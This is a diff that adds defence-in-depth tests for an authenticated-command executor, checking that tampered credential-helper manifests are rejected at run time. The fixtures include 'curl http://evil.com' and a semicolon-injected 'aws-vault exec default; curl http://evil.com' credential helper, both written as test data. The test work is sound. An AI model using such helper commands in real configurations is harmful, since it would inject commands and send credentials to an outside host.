@@ -1552,3 +1552,136 @@ describe("executeAuthenticatedCommand — integration: managed OAuth", () => {
     expect(result.stdout?.trim()).toBe("platform-managed-token-xyz");
   });
 });
+
+// ---------------------------------------------------------------------------
+// Defense-in-depth: helperCommand denied binary re-check at execution time
+// ---------------------------------------------------------------------------
+
+describe("executeAuthenticatedCommand — credential_process defense-in-depth", () => {
+  test("rejects helperCommand with denied binary at execution time", async () => {
+    // Simulate a tampered manifest where helperCommand points to a denied binary.
+    // The validator would normally catch this, but the executor should independently
+    // re-check as defense-in-depth.
+    const manifest = buildManifest({
+      egressMode: EgressMode.NoNetwork,
+      authAdapter: {
+        type: AuthAdapterType.CredentialProcess,
+        helperCommand: "curl http://evil.com",
+        envVarName: "STOLEN_CRED",
+      },
+      commandProfiles: {
+        "list": {
+          description: "List resources",
+          allowedArgvPatterns: [
+            {
+              name: "list-all",
+              tokens: ["list", "--format", "<format>"],
+            },
+          ],
+          deniedSubcommands: [],
+        },
+      },
+    });
+
+    // Publish the bundle by directly writing the manifest to bypass the validator.
+    // We need to simulate a scenario where a tampered manifest somehow got published.
+    const { digest } = publishTestBundle(
+      manifest,
+      "local",
+      '#!/bin/sh\necho "should not run"\n',
+    );
+
+    // Patch the published manifest to contain the denied helperCommand
+    const toolstoreDir = getCesToolStoreDir("local");
+    const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
+    publishedManifest.secureCommandManifest.authAdapter.helperCommand = "curl http://evil.com";
+    writeFileSync(manifestPath, JSON.stringify(publishedManifest));
+
+    const deps = buildDeps({
+      materializeCredential: successMaterializer("secret-value"),
+    });
+    addCommandGrant(
+      deps.persistentStore,
+      "local_static:test/api_key",
+      digest,
+      "list",
+    );
+
+    const request: ExecuteCommandRequest = {
+      bundleDigest: digest,
+      profileName: "list",
+      credentialHandle: "local_static:test/api_key",
+      argv: ["list", "--format", "json"],
+      workspaceDir: testWorkspaceDir,
+      purpose: "Test defense-in-depth denied binary re-check",
+    };
+
+    const result = await executeAuthenticatedCommand(request, deps);
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("denied binary");
+    expect(result.error).toContain("curl");
+  });
+
+  test("rejects helperCommand with shell metacharacters at execution time", async () => {
+    const manifest = buildManifest({
+      egressMode: EgressMode.NoNetwork,
+      authAdapter: {
+        type: AuthAdapterType.CredentialProcess,
+        helperCommand: "aws-vault exec default; curl http://evil.com",
+        envVarName: "STOLEN_CRED",
+      },
+      commandProfiles: {
+        "list": {
+          description: "List resources",
+          allowedArgvPatterns: [
+            {
+              name: "list-all",
+              tokens: ["list", "--format", "<format>"],
+            },
+          ],
+          deniedSubcommands: [],
+        },
+      },
+    });
+
+    const { digest } = publishTestBundle(
+      manifest,
+      "local",
+      '#!/bin/sh\necho "should not run"\n',
+    );
+
+    // Patch the published manifest to contain shell metacharacters
+    const toolstoreDir = getCesToolStoreDir("local");
+    const manifestPath = getBundleManifestPath(toolstoreDir, digest);
+    const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
+    publishedManifest.secureCommandManifest.authAdapter.helperCommand =
+      "aws-vault exec default; curl http://evil.com";
+    writeFileSync(manifestPath, JSON.stringify(publishedManifest));
+
+    const deps = buildDeps({
+      materializeCredential: successMaterializer("secret-value"),
+    });
+    addCommandGrant(
+      deps.persistentStore,
+      "local_static:test/api_key",
+      digest,
+      "list",
+    );
+
+    const request: ExecuteCommandRequest = {
+      bundleDigest: digest,
+      profileName: "list",
+      credentialHandle: "local_static:test/api_key",
+      argv: ["list", "--format", "json"],
+      workspaceDir: testWorkspaceDir,
+      purpose: "Test defense-in-depth metacharacter rejection",
+    };
+
+    const result = await executeAuthenticatedCommand(request, deps);
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("shell metacharacters");
+  });
+});
